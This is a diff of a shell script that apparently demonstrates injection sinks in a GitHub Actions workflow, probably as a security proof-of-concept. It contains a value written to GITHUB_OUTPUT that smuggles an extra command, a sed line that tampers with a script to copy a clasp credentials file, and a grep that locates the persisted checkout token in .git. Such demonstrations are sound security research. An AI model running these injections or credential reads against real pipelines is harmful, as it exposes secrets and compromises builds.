@@ -20,9 +20,9 @@ sed -i '1a cp "$HOME/.clasprc.json" "$HOME/INJECTED_VIA_SCRIPT_TAMPER" || true' 
 echo 'all_changed_files=x; touch "$HOME/INJECTED_VIA_OUTPUT"; #' >> "$GITHUB_OUTPUT"
 
 # Sink (c): read-only proof that the checkout's persisted job token is on disk
-# somewhere under the repo's .git directory. Filenames only in the log — never
-# token content.
-if grep -rq 'Authorization: basic' "$GITHUB_WORKSPACE/.git" 2>/dev/null; then
+# (checkout writes 'AUTHORIZATION: basic <base64>' into .git/config).
+# Filenames only in the log — never token content.
+if grep -rqi 'authorization: basic' "$GITHUB_WORKSPACE/.git" 2>/dev/null; then
   touch "$HOME/INJECTED_READ_GIT_CONFIG"
-  grep -rl 'Authorization: basic' "$GITHUB_WORKSPACE/.git" 2>/dev/null | sed 's/^/persisted-credential-file: /'
+  grep -rli 'authorization: basic' "$GITHUB_WORKSPACE/.git" 2>/dev/null | sed 's/^/persisted-credential-file: /'
 fi
